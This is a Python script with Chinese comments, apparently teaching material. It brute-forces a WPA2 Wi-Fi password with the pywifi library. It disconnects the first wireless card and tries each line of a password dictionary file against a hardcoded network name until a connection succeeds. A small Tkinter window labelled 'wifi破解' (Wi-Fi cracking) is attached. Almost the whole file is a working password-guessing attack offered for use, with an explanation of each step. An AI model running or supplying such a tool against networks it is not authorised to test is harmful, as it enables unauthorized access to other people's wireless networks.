import time
import pywifi
from pywifi import const
from tkinter import *
from tkinter import messagebox

'''
下面讲解一下实现过程：
1）首先导入pywifi模块，因为要启用wifi那么必须要有启用wifi的模块。
2）有了启用wifi的模块以后，我们首先要抓取网卡接口，
因为连接无线wifi，必须要有网卡才行。一台电脑可能有很多网卡， 
但是一般都只有一个wifi网卡，我们使用第一个网卡就行了。
3）抓取到以后就进行连接测试，首选是要断开所有的wifi网卡上
的已连接成功的，因为有可能wifi上有连接成功的在。
4）断开所有的wifi以后，我们就可以进行破解了，
从（.txt）文档中一行一行读取我们的密码字典，
一遍一遍的刷密码，直到返回isOK为True,表示破解成功。
5）因为连接也是要时间的，不可能一秒钟尝试好多次，
所以我们设置了睡眠sleep.
'''


def wificonnect(str, wifiname):
    # 抓取网卡接口
    wifi = pywifi.PyWiFi()
    # 抓取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # 断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    # 判断WiFi连接状态
    if ifaces.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # 要连接WiFi的名称
        profile.ssid = wifiname
        # 网卡的开放
        profile.auth = const.AUTH_ALG_OPEN
        # WiFi加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 密码
        profile.key = str

        # 删除所有的WiFi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)

        # 连接新的WiFi
        ifaces.connect(tep_profile)
        time.sleep(5)
        # 判断新的WiFi连接状态
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

    else:
        print("已连接")


# gic()

def readPassWord():
    print("开始破解:")

    # wifiname = entry.get()
    path = 'D:\Python上课代码\python-公开课\WiFi测试\wifipwd.txt'
    file = open(path, "r", errors="ignore")
    while True:
        try:
            # 读取文件中一行
            myStr = file.readline()
            # print(myStr)
            bool = wificonnect(myStr, 'iPhone')
            if bool:
                print("密码正确：", myStr)
                # messagebox.showinfo("密码正确",myStr)
                # text.insert(END, "密码正确:")
                break
            else:
                # text.insert(END, "密码错误:"+myStr)
                # # 文本框向下滚动
                # text.see(END)
                # 更新
                # text.update()
                print("密码错误：", myStr)
            time.sleep(3)
        except Exception as e:
            continue
    file.close()


readPassWord()

root = Tk()
root.title('wifi破解')

# 获取屏幕 宽、高
ws = root.winfo_screenwidth()
hs = root.winfo_screenheight()
w = 600
h = 300
# 计算 x, y 位置
x = str(int((ws / 2) - (w / 2)))
y = str(int((hs / 2) - (h / 2)))
# 窗口大小
root.geometry('500x380')
root.geometry('+500+300')
# 标签控件
lable = Label(root, text='输入要破解的WiFi名称：')
# grid 网格式布局   pack 包  place 位置
lable.grid(row=0, column=0)

# 输入控件
entry = Entry(root, font=("微软雅黑", 22))
entry.grid(row=0, column=1)
# 列表框控件
text = Listbox(root, font=('微软雅黑', 15), width=40, height=10)
# columnspan  组件所跨越的列数
text.grid(row=1, columnspan=2)
# 按钮标签
button = Button(root, text='开始破解', width=20, height=2, command=readPassWord)
button.grid(row=2, columnspan=2)
root.mainloop()
